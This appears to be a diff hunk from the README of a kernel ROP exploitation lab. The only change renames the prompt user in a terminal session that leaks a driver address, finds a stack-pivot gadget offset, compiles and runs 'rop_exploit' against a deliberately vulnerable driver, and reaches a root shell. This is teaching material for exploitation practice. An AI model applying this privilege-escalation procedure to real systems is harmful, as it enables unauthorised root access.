@@ -28,13 +28,13 @@ following requirements:
 ```
 lone@ubuntu:~$ dmesg | grep addr | grep ops
 [  244.142035] addr(ops) = ffffffffa02e9340
-vnik@ubuntu:~$ ~/find_offset.py ffffffffa02e9340 ~/gadgets 
+lone@ubuntu:~$ ~/find_offset.py ffffffffa02e9340 ~/gadgets 
 offset = 18446744073644231139
 gadget = xchg eax, esp ; ret 0x11e8
 stack addr = 8108e258
 
-vnik@ubuntu:~/kernel_rop/vulndrv$ gcc rop_exploit.c -O2 -o rop_exploit
-vnik@ubuntu:~/kernel_rop/vulndrv$ ./rop_exploit 18446744073644231139 ffffffffa02e9340
+lone@ubuntu:~/kernel_rop/vulndrv$ gcc rop_exploit.c -O2 -o rop_exploit
+lone@ubuntu:~/kernel_rop/vulndrv$ ./rop_exploit 18446744073644231139 ffffffffa02e9340
 array base address = 0xffffffffa02e9340
 stack address = 0x8108e258
 # id    
